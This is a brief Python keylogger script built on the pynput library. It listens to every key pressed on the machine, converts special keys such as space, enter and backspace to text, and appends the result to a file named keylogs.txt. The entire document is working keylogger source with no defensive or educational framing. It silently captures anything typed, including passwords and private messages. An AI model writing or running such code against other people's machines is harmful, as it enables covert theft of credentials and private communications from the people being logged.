from pynput.keyboard import Key, Listener

# Function to write the key to a file
def write_to_file(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")

    if key_data == 'Key.space':
        key_data = ' '
    if key_data == 'Key.enter':
        key_data = '\n'
    if key_data == 'Key.shift_r':
        key_data = ''
    if key_data == 'Key.shift':
        key_data = ''
    if key_data == 'Key.ctrl_l':
        key_data = ''
    if key_data == 'Key.backspace':
        key_data = ' BACKSPACE '

    with open("keylogs.txt", "a") as file:
        file.write(key_data)

# Function to listen to keystrokes
def on_press(key):
    write_to_file(key)

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()


